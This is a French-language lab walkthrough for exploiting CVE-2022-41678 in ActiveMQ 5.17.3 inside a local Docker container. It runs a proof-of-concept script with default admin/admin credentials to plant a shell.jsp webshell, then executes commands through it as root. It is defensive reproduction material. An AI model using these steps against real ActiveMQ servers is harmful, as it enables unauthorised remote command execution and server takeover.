# Exploitation de CVE-2022-41678

Ce document détaille les étapes pour exploiter la vulnérabilité **CVE-2022-41678** sur un serveur ActiveMQ. Il comprend la configuration de l'environnement, l'exécution de l'exploit et la vérification des résultats.

---

## **1. Configuration de l'environnement ActiveMQ**

### Lancer ActiveMQ avec Docker
1. Accédez au dossier `activemq_2022`.
2. Démarrez ActiveMQ en arrière-plan avec la commande suivante :
   ```bash
   docker compose up -d
   ```
3. Accédez à l'interface d'administration ActiveMQ dans votre navigateur à l'adresse :
   ```
   http://localhost:8161/admin/
   ```
   Vous devriez voir la version ActiveMQ (exemple : **5.17.3**).

   ![Interface ActiveMQ](https://github.com/user-attachments/assets/4b41d643-0f8f-428c-8947-7d262ad6d675)

### Vérifier la version d'ActiveMQ
- La version peut également être confirmée dans le fichier `docker-compose.yml`.

   ![Version dans docker-compose.yml](https://github.com/user-attachments/assets/75a8b851-0764-4f93-b1c9-d5dad932761b)

---

## **2. Identifier les services actifs**

Utilisez `nmap` pour scanner les ports ouverts et confirmer que les services ActiveMQ sont actifs :
```bash
nmap -p- 192.168.1.145
```

   ![Résultats de nmap](https://github.com/user-attachments/assets/25f4b9ef-635b-4b9a-9c9d-45d6ca0e4f06)

---

## **3. Exploiter la vulnérabilité**

### Exécution de l'exploit
1. Utilisez le script `poc.py` pour exploiter la vulnérabilité avec la commande suivante :
   ```bash
   python3 poc.py -u admin -p admin http://localhost:8161
   ```
   Cette commande envoie une requête malveillante pour téléverser un fichier WebShell.

   ![Envoi de l'exploit](https://github.com/user-attachments/assets/c0103ec8-63c1-4ff0-964e-90c0822ae66d)

### Accéder au WebShell
2. Une fois l'exploit réussi, ouvrez le WebShell dans votre navigateur à l'adresse suivante :
   ```
   http://localhost:8161/admin/shell.jsp?cmd=id
   ```
   - La commande `id` retourne l'utilisateur actuel, par exemple : `uid=0(root) gid=0(root) groups=0(root)`.

   ![Confirmation de l'accès root](https://github.com/user-attachments/assets/9b84720c-4359-453e-86f3-edb637c67039)

3. Remplacez `cmd=id` par d'autres commandes pour interagir avec le serveur. Exemple :
   ```
   http://localhost:8161/admin/shell.jsp?cmd=ls
   ```
   - Cela affiche la liste des fichiers présents sur le serveur.

   ![Affichage des fichiers](https://github.com/user-attachments/assets/2b1241fb-b26f-4f18-abff-4db980a52eb0)

---

## **4. Vérification du succès de l'injection**

### Accéder au conteneur ActiveMQ
1. Listez les conteneurs actifs pour récupérer l'ID du conteneur ActiveMQ :
   ```bash
   docker ps -a
   ```

   ![Liste des conteneurs](https://github.com/user-attachments/assets/ee668944-b29f-4b7e-a323-a812d2445003)

2. Accédez au conteneur ActiveMQ avec la commande suivante :
   ```bash
   docker exec -it <ID_du_conteneur> /bin/bash
   ```
   - Remplacez `<ID_du_conteneur>` par l'ID récupéré précédemment.

### Vérifier l'injection du WebShell
1. Accédez au répertoire où le WebShell a été téléversé :
   ```bash
   cd /opt/activemq/webapps/admin/
   ```

   ![Accès au répertoire admin](https://github.com/user-attachments/assets/33206ee1-aeeb-4758-83f6-04286460ed72)

2. Vérifiez la présence du fichier `shell.jsp` :
   ```bash
   ls
   ```

   ![Vérification de shell.jsp](https://github.com/user-attachments/assets/06ea52ec-ef9a-4705-a416-30c6b62f00f4)

3. Confirmez le contenu du fichier WebShell en l'ouvrant avec une commande comme :
   ```bash
   cat shell.jsp
   ```

   ![Contenu du WebShell](https://github.com/user-attachments/assets/6953fdea-10b1-4a3c-b2be-47962d3af384)

   Cette étape montre clairement que le fichier WebShell a été injecté et est prêt à être utilisé.

---
